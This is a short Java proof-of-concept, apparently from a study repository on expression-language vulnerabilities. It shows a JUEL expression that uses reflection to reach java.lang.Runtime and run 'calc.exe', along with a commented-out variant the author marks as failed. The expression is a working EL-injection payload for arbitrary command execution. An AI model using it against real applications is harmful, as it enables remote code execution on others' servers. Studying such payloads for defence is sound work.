package drunkbaby.basicelvul;

import de.odysseus.el.ExpressionFactoryImpl;
import de.odysseus.el.util.SimpleContext;

import javax.el.ExpressionFactory;
import javax.el.ValueExpression;

public class juelExec {
    public static void main(String[] args) {
        ExpressionFactory expressionFactory = new ExpressionFactoryImpl();
        SimpleContext simpleContext = new SimpleContext();
        // failed
        // String exp = "${''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')}";
        // ok
        String exp = "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')}";
        ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class);
        System.out.println(valueExpression.getValue(simpleContext));
    }
}